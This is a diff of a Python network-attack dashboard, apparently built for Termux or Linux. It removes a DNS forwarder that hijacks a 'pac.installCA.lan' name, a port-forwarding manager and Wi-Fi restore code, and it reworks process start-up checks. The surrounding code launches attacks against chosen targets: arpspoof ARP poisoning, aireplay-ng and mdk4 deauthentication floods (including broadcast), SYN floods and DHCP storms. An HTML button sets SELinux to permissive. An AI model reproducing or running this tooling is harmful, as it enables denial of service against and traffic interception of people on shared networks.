-                    cmd = ['ip', 'rule', 'del', 'priority', str(rule_info['priority'])]
-                    subprocess.run(cmd, capture_output=True, timeout=3, check=False)
-                    with self.lock:
-                        if rule_id in self.active_rules:
-                            del self.active_rules[rule_id]
-                except Exception as e:
-                    add_log('dev', f'Rule cleanup: {e}')
-
-            # Flush and delete the table
-            try:
-                subprocess.run(
-                    ['ip', 'route', 'flush', 'table', str(table_id)],
-                    capture_output=True, timeout=3, check=False
-                )
-            except Exception as e:
-                add_log('dev', f'Table flush: {e}')
-
-            with self.lock:
-                if table_id in self.active_tables:
-                    del self.active_tables[table_id]
-
-            add_log('dev', f'Routing table {table_id} disabled and cleaned up')
-            return True
-
-        except Exception as e:
-            add_log('warn', f'Failed to disable table {table_id}: {e}')
-            return False
-
-    def cleanup_all(self):
-        """Remove all forwarding rules and routing tables."""
-        try:
-            with self.lock:
-                tables_to_remove = list(self.active_tables.keys())
-
-            for table_id in tables_to_remove:
-                self.disable_table(table_id)
-
-            add_log('success', 'All port forwarding rules cleaned up')
-            return True
-        except Exception as e:
-            add_log('error', f'Cleanup failed: {e}')
-            return False
-
-    def get_status(self):
-        """Get status of all active port forwarding rules."""
-        with self.lock:
-            status = {
-                'available': self.is_available(),
-                'active_tables': len(self.active_tables),
-                'active_rules': len(self.active_rules),
-                'tables': {},
-                'rules': {}
-            }
-
-            for table_id, table_info in self.active_tables.items():
-                status['tables'][table_id] = {
-                    'name': table_info['name'],
-                    'routes': len(table_info['routes']),
-                    'route_list': table_info['routes']
-                }
-
-            for rule_id, rule_info in self.active_rules.items():
-                status['rules'][rule_id] = {
-                    'priority': rule_info['priority'],
-                    'selector': rule_info['selector'],
-                    'table': rule_info['table']
-                }
-
-            return status
-
-# Global port forwarding manager instance
-PORT_FORWARDING_MANAGER = PortForwardingManager()
-
-# ---------- Android Runtime Integration (Phase 10) ----------
-class AndroidRuntime:
-    """Manages Android/Termux-specific runtime constraints and subprocess isolation.
-
-    Handles SELinux contexts, capability management, signal handling, and
-    ProcessGroup lifecycle within Termux confined environment.
-    """
-
-    def __init__(self):
-        self.is_termux = os.environ.get('PREFIX') and 'termux' in os.environ.get('PREFIX', '').lower()
-        self.selinux_context = None
-        self.process_groups = {}  # Track ProcessGroup instances
-        self.confined = self.is_termux
-        self.lock = threading.RLock()
-
-    def detect_platform(self):
-        """Detect if running on Android/Termux."""
-        platform_signals = [
-            os.path.exists('/data/data/com.termux'),
-            os.path.exists('/system/build.prop'),
-            'TERMUX_VERSION' in os.environ,
-            os.environ.get('PREFIX', '').endswith('com.termux'),
-        ]
-        return any(platform_signals)
-
-    def get_selinux_context(self):
-        """Get current SELinux context."""
-        try:
-            result = subprocess.run(
-                ['id', '-Z'],
-                capture_output=True, timeout=2, text=True
-            )
-            if result.returncode == 0:
-                context = result.stdout.strip()
-                self.selinux_context = context
-                return context
-        except Exception:
-            pass
-        return None
-
-    def check_selinux_constraints(self):
-        """Identify SELinux constraints affecting packet capture."""
-        constraints = {
-            'selinux_enabled': False,
-            'context': self.get_selinux_context(),
-            'issues': []
-        }
-
-        # Check if SELinux is enforcing
-        try:
-            result = subprocess.run(
-                ['getenforce'],
-                capture_output=True, timeout=2, text=True
-            )
-            if result.returncode == 0:
-                mode = result.stdout.strip()
-                constraints['selinux_enabled'] = mode in ('Enforcing', 'Permissive')
-                if mode == 'Enforcing':
-                    constraints['issues'].append('SELinux in Enforcing mode may block raw sockets')
-        except Exception:
-            pass
-
-        # Check for specific denials that block packet capture
-        try:
-            result = subprocess.run(
-                ['dmesg'],
-                capture_output=True, timeout=2, text=True
-            )
-            if 'avc: denied' in result.stdout.lower():
-                constraints['issues'].append('SELinux denials detected in dmesg')
-        except Exception:
-            pass
-
-        return constraints
-
-    def handle_subprocess_signal(self, signum, frame):
-        """Handle signals in subprocesses (SIGTERM, SIGINT, etc.)."""
-        add_log('dev', f'Subprocess received signal {signum}')
-        # Propagate to child processes in all groups
-        with self.lock:
-            for group_name, group in self.process_groups.items():
-                if hasattr(group, 'terminate_all'):
-                    try:
-                        group.terminate_all()
-                    except Exception as e:
-                        add_log('warn', f'Error terminating {group_name}: {e}')
-
-    def setup_subprocess_environment(self):
-        """Setup environment for subprocesses in confined mode."""
-        env = os.environ.copy()
-
-        # Android/Termux specific: ensure standard paths exist
-        if self.is_termux:
-            prefixes = [
-                os.environ.get('PREFIX'),
-                '/data/data/com.termux/files/usr',
-                '/storage/emulated/0'
-            ]
-            for prefix in prefixes:
-                if prefix and os.path.exists(prefix):
-                    if 'PATH' not in env:
-                        env['PATH'] = prefix + '/bin'
-                    elif prefix + '/bin' not in env['PATH']:
-                        env['PATH'] = prefix + '/bin:' + env['PATH']
-
-            # Set HOME for tools that expect it
-            if 'HOME' not in env and os.environ.get('PREFIX'):
-                home_candidate = os.path.join(os.environ.get('PREFIX'), 'home')
-                if os.path.exists(home_candidate):
-                    env['HOME'] = home_candidate
-
-        return env
-
-    def register_process_group(self, name, group):
-        """Register a ProcessGroup for lifecycle management."""
-        with self.lock:
-            self.process_groups[name] = group
-        add_log('dev', f'Registered ProcessGroup: {name}')
-
-    def unregister_process_group(self, name):
-        """Unregister a ProcessGroup."""
-        with self.lock:
-            if name in self.process_groups:
-                del self.process_groups[name]
-        add_log('dev', f'Unregistered ProcessGroup: {name}')
-
-    def cleanup_all_processes(self):
-        """Cleanup all registered ProcessGroups."""
-        try:
-            with self.lock:
-                groups_to_cleanup = list(self.process_groups.items())
-
-            for group_name, group in groups_to_cleanup:
-                try:
-                    if hasattr(group, 'terminate_all'):
-                        group.terminate_all()
-                    self.unregister_process_group(group_name)
-                except Exception as e:
-                    add_log('warn', f'Error cleaning up {group_name}: {e}')
-
-            add_log('success', 'All ProcessGroups cleaned up')
-            return True
-        except Exception as e:
-            add_log('error', f'Cleanup failed: {e}')
-            return False
-
-    def get_status(self):
-        """Get Android runtime status."""
-        with self.lock:
-            status = {
-                'is_termux': self.is_termux,
-                'platform_detected': self.detect_platform(),
-                'confined': self.confined,
-                'selinux': self.check_selinux_constraints(),
-                'process_groups': len(self.process_groups),
-                'process_group_names': list(self.process_groups.keys())
-            }
-
-        return status
-
-# Global Android runtime instance
-ANDROID_RUNTIME = AndroidRuntime()
-
-# ---------- Python DNS forwarder (Unbound fallback) ----------
-class PythonDNSForwarder:
-    """Lightweight DNS server for hijacking .lan domains and blocking ad/tracking domains."""
-
-    def __init__(self, listen_ip='0.0.0.0', listen_port=53, upstream_servers=None, lan_domains=None, blocked_domains=None):
-        self.listen_ip = listen_ip
-        self.listen_port = listen_port
-        self.upstream_servers = upstream_servers or ['8.8.8.8', '8.8.4.4']
-        self.lan_domains = lan_domains or ['pac.installCA.lan']
-        self.blocked_domains = set(blocked_domains or [])
-        self.socket = None
-        self.running = False
-        self.request_cache = {}  # Simple cache for responses
-
-    def start(self):
-        """Start DNS forwarder in daemon thread."""
-        try:
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.socket.bind((self.listen_ip, self.listen_port))
-            self.running = True
-            add_log('success', f'Python DNS forwarder listening on {self.listen_ip}:{self.listen_port}')
-
-            thread = threading.Thread(target=self._dns_loop, daemon=True)
-            thread.start()
-            return True
-        except OSError as e:
-            add_log('error', f'Failed to start DNS forwarder on port {self.listen_port}: {e}')
-            return False
-
-    def stop(self):
-        """Stop DNS forwarder."""
-        self.running = False
-        try:
-            if self.socket:
-                self.socket.close()
-        except:
-            pass
-        add_log('info', 'DNS forwarder stopped')
-
-    def _dns_loop(self):
-        """Main DNS query handling loop."""
-        while self.running:
-            try:
-                self.socket.settimeout(2)
-                data, addr = self.socket.recvfrom(512)
-                threading.Thread(target=self._handle_query, args=(data, addr), daemon=True).start()
-            except socket.timeout:
-                continue
-            except Exception as e:
-                if self.running:
-                    add_log('warn', f'DNS loop error: {e}')
-
-    def _handle_query(self, data, addr):
-        """Handle single DNS query."""
-        try:
-            # Parse DNS query
-            txid = struct.unpack('!H', data[0:2])[0]
-            flags = struct.unpack('!H', data[2:4])[0]
-            qdcount = struct.unpack('!H', data[4:6])[0]
-
-            if not (flags & 0x8000):  # Query, not response
-                # Extract hostname from query
-                hostname = self._extract_hostname(data[12:])
-
-                # Check if .lan domain
-                if any(hostname.endswith(lan) for lan in self.lan_domains):
-                    response = self._build_response(txid, data, hostname, self._get_local_ip())
-                    self.socket.sendto(response, addr)
-                    return
-
-                # Check if blocked domain
-                if hostname.lower() in self.blocked_domains:
-                    response = self._build_nxdomain_response(txid, data, hostname)
-                    self.socket.sendto(response, addr)
-                    return
-
-                # Forward to upstream
-                self._forward_query(data, addr, txid)
-        except Exception as e:
-            add_log('warn', f'DNS query handling error: {e}')
-
-    def _extract_hostname(self, query_section):
-        """Extract hostname from DNS query section."""
-        try:
-            parts = []
-            idx = 0
-            while idx < len(query_section):
-                length = query_section[idx]
-                if length == 0:
-                    break
-                idx += 1
-                parts.append(query_section[idx:idx+length].decode('ascii', errors='ignore'))
-                idx += length
-            return '.'.join(parts)
-        except:
-            return ''
-
-    def _build_response(self, txid, original_query, hostname, local_ip):
-        """Build DNS A record response for .lan domain."""
-        # Response header (copied from query with response flag)
-        header = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
-
-        # Question section (copy from original)
-        question_start = 12
-        question_end = original_query.index(b'\x00\x01\x00\x01', question_start) + 4 if b'\x00\x01\x00\x01' in original_query[question_start:] else len(original_query)
-        question = original_query[question_start:question_end]
-
-        # Answer section: A record with local IP
-        hostname_bytes = self._encode_hostname(hostname)
-        answer = hostname_bytes + struct.pack('!HHIH', 1, 1, 300, 4)  # Type A, class IN, TTL 300s, length 4
-        answer += socket.inet_aton(local_ip)
-
-        return header + question + answer
-
-    def _build_nxdomain_response(self, txid, original_query, hostname):
-        """Build NXDOMAIN response for blocked domain."""
-        # Response header with NXDOMAIN (rcode=3)
-        header = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 0, 0)
-
-        # Question section
-        question_start = 12
-        question_end = original_query.index(b'\x00\x01\x00\x01', question_start) + 4 if b'\x00\x01\x00\x01' in original_query[question_start:] else len(original_query)
-        question = original_query[question_start:question_end]
-
-        return header + question
-
-    def _encode_hostname(self, hostname):
-        """Encode hostname to DNS name format."""
-        parts = hostname.rstrip('.').split('.')
-        encoded = b''
-        for part in parts:
-            encoded += struct.pack('!B', len(part)) + part.encode('ascii')
-        encoded += b'\x00'
-        return encoded
-
-    def _get_local_ip(self):
-        """Get device's local IP for .lan responses."""
-        return get_local_ip()
-
-    def _forward_query(self, data, client_addr, txid):
-        """Forward query to upstream DNS server."""
-        for upstream in self.upstream_servers:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.settimeout(3)
-                sock.sendto(data, (upstream, 53))
-                response, _ = sock.recvfrom(512)
-                sock.close()
-                self.socket.sendto(response, client_addr)
-                return
-            except Exception:
-                continue
-
-        # If all upstreams fail, send SERVFAIL
-        header = struct.pack('!HHHHHH', txid, 0x8402, 1, 0, 0, 0)
-        self.socket.sendto(header + data[12:], client_addr)
-
-# Global DNS forwarder instance
-_dns_forwarder = None
-
-def start_python_dns_forwarder(listen_port=53, lan_domains=None, blocked_domains=None):
-    """Start Python DNS forwarder as fallback for Unbound."""
-    global _dns_forwarder
-    if _dns_forwarder and _dns_forwarder.running:
-        add_log('info', 'DNS forwarder already running')
-        return True
-
-    _dns_forwarder = PythonDNSForwarder(
-        listen_port=listen_port,
-        lan_domains=lan_domains or ['pac.installCA.lan'],
-        blocked_domains=blocked_domains or list(DEFAULT_BLOCKED_DOMAINS)
-    )
-    return _dns_forwarder.start()
-
-def stop_python_dns_forwarder():
-    """Stop Python DNS forwarder."""
-    global _dns_forwarder
-    if _dns_forwarder:
-        _dns_forwarder.stop()
-        _dns_forwarder = None
 
 # ---------- gateway: DNS privacy stack ----------
 def fetch_blocklist_domains():
@@ -4177,11 +2344,8 @@ def write_gateway_configs(domains, lan_domains=None):
 def gateway_blocklist_count():
     try:
         with open(GW_BLOCKLIST_CONF) as f:
-            count = sum(1 for _ in f)
-        add_log('dev', f'DNS blocklist contains {count} entries')
-        return count
-    except Exception as e:
-        add_log('warn', f'Failed to count blocklist entries from {GW_BLOCKLIST_CONF}: {e}')
+            return sum(1 for _ in f)
+    except:
         return 0
 
 def gateway_dns_status():
@@ -4209,31 +2373,23 @@ def start_gateway_dns():
         try:
             dnscrypt_proc = subprocess.Popen(['dnscrypt-proxy', '-config', GW_DNSCRYPT_CONF],
                                             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            try:
-                _, err_bytes = dnscrypt_proc.communicate(timeout=2)
-                # Process exited immediately (bad - initialization error)
-                err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
+            time.sleep(1.5)
+            if dnscrypt_proc.poll() is not None:
+                err = dnscrypt_proc.stderr.read().decode(errors='ignore')[-400:]
                 add_log('warning', f'dnscrypt-proxy failed to start: {err}, falling back to unbound only')
                 dnscrypt_proc = None
-            except subprocess.TimeoutExpired:
-                # Process still running after timeout (good - initialization succeeded)
-                pass
         except Exception as e:
             add_log('warning', f'Failed to start dnscrypt-proxy: {e}, falling back to unbound only')
             dnscrypt_proc = None
 
     unbound_proc = subprocess.Popen(['unbound', '-c', GW_UNBOUND_CONF, '-d'],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    try:
-        _, err_bytes = unbound_proc.communicate(timeout=2)
-        # Process exited immediately (bad - initialization error)
-        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
+    time.sleep(1)
+    if unbound_proc.poll() is not None:
+        err = unbound_proc.stderr.read().decode(errors='ignore')[-400:]
         if dnscrypt_proc:
             stop_proc('dnscrypt-proxy')
         raise RuntimeError(f'unbound failed to start: {err}')
-    except subprocess.TimeoutExpired:
-        # Process still running after timeout (good - initialization succeeded)
-        pass
 
     if dnscrypt_proc:
         add_log('success', 'Gateway DNS stack started (Unbound + DNSCrypt-proxy)')
@@ -4262,9 +2418,8 @@ def gateway_vpn_status():
     try:
         out = subprocess.check_output(['ip', 'link', 'show', 'wg0'], stderr=subprocess.DEVNULL, text=True)
         wg_active = 'UP' in out.split('<', 1)[-1].split('>', 1)[0] if '<' in out else False
-        add_log('dev', f'WireGuard interface wg0 status: {"UP" if wg_active else "DOWN"}')
-    except Exception as e:
-        add_log('dev', f'WireGuard interface wg0 not found or not accessible: {e}')
+    except:
+        pass
     openvpn_active = proc_running('openvpn')
     cloudflared_active = proc_running('cloudflared')
     return {
@@ -4301,14 +2456,10 @@ def start_gateway_proxy():
     time.sleep(0.3)
     proc = subprocess.Popen(['tinyproxy', '-c', GW_TINYPROXY_CONF, '-d'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    try:
-        _, err_bytes = proc.communicate(timeout=2)
-        # Process exited immediately (bad - initialization error)
-        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
+    time.sleep(1)
+    if proc.poll() is not None:
+        err = proc.stderr.read().decode(errors='ignore')[-400:]
         raise RuntimeError(f'tinyproxy failed to start: {err}')
-    except subprocess.TimeoutExpired:
-        # Process still running after timeout (good - initialization succeeded)
-        pass
     add_log('success', f'Gateway proxy started on port {GW_PROXY_PORT}')
 
 def stop_gateway_proxy():
@@ -4445,14 +2596,10 @@ def start_ngrok_tunnel(port, authtoken=None):
     time.sleep(0.3)
     proc = subprocess.Popen(['ngrok', 'http', str(port), '--log=stdout'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    try:
-        _, err_bytes = proc.communicate(timeout=3)
-        # Process exited immediately (bad - initialization error)
-        err = err_bytes.decode(errors='ignore')[-400:] if err_bytes else ''
+    time.sleep(2)
+    if proc.poll() is not None:
+        err = proc.stderr.read().decode(errors='ignore')[-400:] if proc.stderr else ''
         raise RuntimeError(f'ngrok failed to start: {err}')
-    except subprocess.TimeoutExpired:
-        # Process still running after timeout (good - initialization succeeded)
-        pass
     return proc
 
 def get_ngrok_public_url():
@@ -4470,139 +2617,25 @@ def get_ngrok_public_url():
         return None
 
 # ---------- monitor mode ----------
-# Global state for Wi-Fi restoration
-_wifi_state = {'ssid': None, 'bssid': None, 'freq': None}
-
-def _save_wifi_state(iface):
-    """Save current Wi-Fi network info before switching to monitor mode."""
-    global _wifi_state
-    try:
-        # Try to get current connection info via iw
-        out = subprocess.check_output(['iw', 'dev', iface, 'link'], text=True, stderr=subprocess.PIPE)
-        for line in out.split('\n'):
-            if 'SSID:' in line:
-                _wifi_state['ssid'] = line.split('SSID:')[1].strip()
-            elif 'freq:' in line:
-                _wifi_state['freq'] = line.split('freq:')[1].strip().split()[0]
-        add_log('dev', f'Saved Wi-Fi state: SSID={_wifi_state.get("ssid")}, freq={_wifi_state.get("freq")}')
-        return True
-    except:
-        add_log('dev', 'Could not save Wi-Fi state (interface may be disconnected)')
-        return False
-
-def _restore_wifi_state(iface):
-    """Attempt to restore Wi-Fi connection after switching back to managed mode."""
-    global _wifi_state
-    if not _wifi_state.get('ssid'):
-        add_log('dev', 'No saved Wi-Fi state to restore')
-        return False
-
-    try:
-        # Wait a moment for interface to stabilize
-        time.sleep(1)
-
-        # Try nmcli if available (preferred method)
-        try:
-            subprocess.run(['nmcli', 'device', 'wifi', 'connect', _wifi_state['ssid']],
-                         timeout=10, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            add_log('success', f'Restored Wi-Fi connection to {_wifi_state["ssid"]} via nmcli')
-            return True
-        except:
-            pass
-
-        # Fallback: try wpa_cli reconnect
-        try:
-            subprocess.run(['wpa_cli', '-i', iface, 'reconnect'],
-                         timeout=5, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            add_log('success', f'Restored Wi-Fi connection to {_wifi_state["ssid"]} via wpa_cli')
-            return True
-        except:
-            pass
-
-        add_log('warn', f'Failed to restore Wi-Fi connection to {_wifi_state["ssid"]} -- manual reconnection may be needed')
-        return False
-    except Exception as e:
-        add_log('warn', f'Error restoring Wi-Fi: {e}')
-        return False
-
 def set_monitor(iface, enable=True, raise_on_fail=False):
-    """Set monitor mode with proper interface lifecycle management.
-
-    - Enables: save Wi-Fi state → down → set monitor → up
-    - Disables: down → set managed → up → restore Wi-Fi
-    """
+    """Attempt to set monitor mode. Returns True on success, False otherwise."""
     mode = 'monitor' if enable else 'managed'
     try:
+        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
+                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         if enable:
-            # Before switching to monitor, save Wi-Fi state
-            _save_wifi_state(iface)
-
-            # Bring interface down
-            add_log('dev', f'Bringing {iface} down before monitor mode switch')
-            subprocess.run(['ip', 'link', 'set', iface, 'down'],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-            time.sleep(0.3)
-
-            # Switch to monitor mode
-            add_log('dev', f'Switching {iface} to monitor mode')
-            subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-
-            # Bring interface back up
-            add_log('dev', f'Bringing {iface} up')
-            subprocess.run(['ip', 'link', 'set', iface, 'up'],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-
-            # Verify monitor mode is active
             time.sleep(0.5)
-            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True, timeout=5)
+            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
             if 'type monitor' not in out:
                 raise RuntimeError(f'Failed to set monitor mode on {iface}')
-
-            add_log('success', f'Monitor mode enabled on {iface}')
-            return True
-        else:
-            # Bring interface down
-            add_log('dev', f'Bringing {iface} down before managed mode switch')
-            subprocess.run(['ip', 'link', 'set', iface, 'down'],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-            time.sleep(0.3)
-
-            # Switch to managed mode
-            add_log('dev', f'Switching {iface} to managed mode')
-            subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-
-            # Bring interface back up
-            add_log('dev', f'Bringing {iface} up')
-            subprocess.run(['ip', 'link', 'set', iface, 'up'],
-                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
-
-            time.sleep(0.5)
-            add_log('success', f'Monitor mode disabled on {iface}, switched to managed')
-
-            # Attempt to restore Wi-Fi connection
-            _restore_wifi_state(iface)
-            return True
-
+        return True
     except subprocess.CalledProcessError as e:
-        err = e.stderr.decode(errors='ignore') if e.stderr else str(e)
-        msg = f'Monitor mode change failed (exit {e.returncode}, {err.strip()[-100:]}). Interface may not support monitor mode.'
         if raise_on_fail:
-            raise RuntimeError(msg)
-        add_log('error', msg)
-        return False
-    except subprocess.TimeoutExpired:
-        msg = f'Monitor mode change timed out on {iface}'
-        if raise_on_fail:
-            raise RuntimeError(msg)
-        add_log('error', msg)
+            raise RuntimeError(f'Monitor mode change failed (exit {e.returncode}). Interface may not support monitor mode.')
         return False
     except Exception as e:
-        msg = f'Monitor mode error: {str(e)}'
         if raise_on_fail:
-            raise RuntimeError(msg)
-        add_log('error', msg)
+            raise RuntimeError(str(e))
         return False
 
 def check_monitor_mode_ioctl(iface):
@@ -4851,32 +2884,24 @@ def start_attack_arp_freeze(targets, gateway, iface):
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            try:
-                _, err_bytes = proc.communicate(timeout=0.5)
-                # Process exited immediately (bad - initialization error)
-                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
                 error_msg = f'arpspoof failed for target {t}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
-            except subprocess.TimeoutExpired:
-                # Process still running after timeout (good - initialization succeeded)
-                pass
             pids.append(proc)
         for t in targets:
             cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            try:
-                _, err_bytes = proc.communicate(timeout=0.5)
-                # Process exited immediately (bad - initialization error)
-                stderr = err_bytes.decode(errors='ignore').strip() if err_bytes else ''
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
                 error_msg = f'arpspoof failed for gateway {gateway}'
                 if stderr:
                     error_msg += f': {stderr}'
                 raise RuntimeError(error_msg)
-            except subprocess.TimeoutExpired:
-                # Process still running after timeout (good - initialization succeeded)
-                pass
             pids.append(proc)
         return pids
     else:
@@ -4940,14 +2965,10 @@ def start_attack_arp_freeze(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        try:
-            _, err_bytes = proc.communicate(timeout=0.5)
-            # Process exited immediately (bad - initialization error)
-            stderr = err_bytes.decode(errors='ignore') if err_bytes else ''
+        time.sleep(0.5)
+        if proc.poll() is not None:
+            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
             raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
-        except subprocess.TimeoutExpired:
-            # Process still running after timeout (good - initialization succeeded)
-            pass
         # Monitor stderr from the ARP script in background
         def monitor_arp_fallback(proc_ref, path_ref):
             try:
@@ -4991,11 +3012,9 @@ def start_attack_deauth_native(targets, iface):
     with open(path, 'w') as f:
         f.write(script)
     proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-    try:
-        _, err_bytes = proc.communicate(timeout=0.5)
+    time.sleep(0.5)
+    if proc.poll() is not None:
         raise RuntimeError('Native deauth flood script exited immediately')
-    except subprocess.TimeoutExpired:
-        pass  # Process still running (good), continue
     threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
     return [proc]
 
@@ -5029,14 +3048,14 @@ def start_attack_deauth(targets, gateway, iface):
                         break
                 if t_mac:
                     cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
-                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                     time.sleep(0.1)
                     if proc.poll() is not None:
                         continue
                     pids.append(proc)
         if not pids:
             cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
-            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
             time.sleep(0.1)
             if proc.poll() is not None:
                 raise RuntimeError('aireplay-ng broadcast deauth failed')
@@ -5044,7 +3063,7 @@ def start_attack_deauth(targets, gateway, iface):
         return pids
     elif ensure_tool('mdk4'):
         cmd = ['mdk4', iface, 'd', '-c', '100']
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
         time.sleep(0.1)
         if proc.poll() is not None:
             raise RuntimeError('mdk4 deauth failed')
@@ -5077,11 +3096,9 @@ def start_attack_deauth(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        try:
-            _, err_bytes = proc.communicate(timeout=0.5)
+        time.sleep(0.5)
+        if proc.poll() is not None:
             raise RuntimeError('Deauth fallback script exited immediately')
-        except subprocess.TimeoutExpired:
-            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5136,11 +3153,9 @@ def start_attack_syn_flood(targets, port, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        try:
-            _, err_bytes = proc.communicate(timeout=0.5)
+        time.sleep(0.5)
+        if proc.poll() is not None:
             raise RuntimeError('SYN flood fallback script exited immediately')
-        except subprocess.TimeoutExpired:
-            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5202,11 +3217,9 @@ def start_attack_dhcp_storm(targets, gateway, iface):
         with open(path, 'w') as f:
             f.write(script)
         proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
-        try:
-            _, err_bytes = proc.communicate(timeout=0.5)
+        time.sleep(0.5)
+        if proc.poll() is not None:
             raise RuntimeError('DHCP storm fallback script exited immediately (raw socket permission likely denied)')
-        except subprocess.TimeoutExpired:
-            pass  # Process still running (good), continue
         threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
         pids.append(proc)
         return pids
@@ -5766,41 +3779,16 @@ def assess_attack_risk(weapon_id, targets, gateway, iface):
         )
     return ' '.join(notes) if notes else None
 
-def kill_attack(pids, timeout_per_process=1.0, max_total_timeout=10.0):
-    """Kill attack processes with aggressive timeout handling.
-
-    Args:
-        pids: List of Popen objects to terminate
-        timeout_per_process: Max seconds to wait for graceful termination per process
-        max_total_timeout: Max total seconds for entire kill operation
-    """
-    import time
-    start_time = time.time()
-
+def kill_attack(pids):
     for proc in pids:
-        # Check if we've exceeded total timeout
-        elapsed = time.time() - start_time
-        if elapsed >= max_total_timeout:
-            add_log('warn', f'Process termination timeout exceeded ({elapsed:.1f}s), forcing kill')
-            break
-
         try:
-            # Try graceful termination first
-            if proc.poll() is None:  # Process still running
-                proc.terminate()
-                try:
-                    # Wait with reduced timeout
-                    remaining = max(0.1, max_total_timeout - elapsed)
-                    proc.wait(timeout=min(timeout_per_process, remaining))
-                except subprocess.TimeoutExpired:
-                    # Graceful termination timed out, use SIGKILL
-                    try:
-                        proc.kill()
-                        proc.wait(timeout=0.5)
-                    except:
-                        pass  # Give up on this process
-        except Exception as e:
-            add_log('dev', f'Error terminating process: {e}')
+            proc.terminate()
+            proc.wait(timeout=2)
+        except:
+            try:
+                proc.kill()
+            except:
+                pass
 
 # ---------- kick & block with verification ----------
 def arp_kick_burst(ip, gateway, iface, duration=6):
@@ -6915,12 +4903,6 @@ nav button .icon svg { display: block; }
     <div id="root-warning" class="status-message" style="display:none; border-left-color:var(--danger);">
       <strong>Not running as root.</strong> Recon scanning, ARP Freeze, Deauth Flood, SYN Flood, DHCP Storm, and Traffic Capture all need raw sockets (and <code>iw</code>/<code>iptables</code> for some), which require root. Run this with <code>sudo</code> (or as root in Termux) or these will fail.
     </div>
-    <div id="selinux-warning" class="status-message" style="display:none; border-left-color:var(--warning);">
-      <strong>⚠️ SELinux is ENFORCING.</strong> Network operations may be blocked. <button class="btn" onclick="setSelinuxPermissive()" style="margin-left:10px; padding:8px 12px; font-size:0.9rem;">Set Permissive</button> or <button class="btn secondary" onclick="updateSelinuxStatus()" style="margin-left:6px; padding:8px 12px; font-size:0.9rem;">Refresh</button>
-    </div>
-    <div id="capabilities-warning" class="status-message" style="display:none; border-left-color:var(--danger);">
